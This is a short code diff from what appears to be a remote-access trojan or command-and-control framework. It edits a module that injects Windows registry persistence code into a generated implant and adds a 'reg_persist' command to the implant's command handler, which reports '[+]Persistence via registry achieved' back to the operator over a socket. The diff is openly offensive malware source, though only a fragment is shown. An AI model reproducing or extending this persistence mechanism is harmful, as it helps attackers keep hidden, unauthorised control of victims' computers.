@@ -1,10 +1,9 @@
-# WEB + COM
+# GUI + CUI
 # done
 import library.modules.config as config
+
 config.main()
 interface = config.interface
-if interface == "GUI":
-    from flask import jsonify
 
 
 def main(option):
@@ -20,7 +19,7 @@ def registry_persist(path):
     winreg.FlushKey(key)
     winreg.CloseKey(key)
     winreg.CloseKey(reg)
-    main_send('[+]Persistence via registry achieved', s)''')
+    send_all(s,'[+]Persistence via registry achieved')''')
         config.logics.append('''
             elif command == "reg_persist":
                 registry_persist(path.join(getcwd(),path.abspath(argv[0])))''')
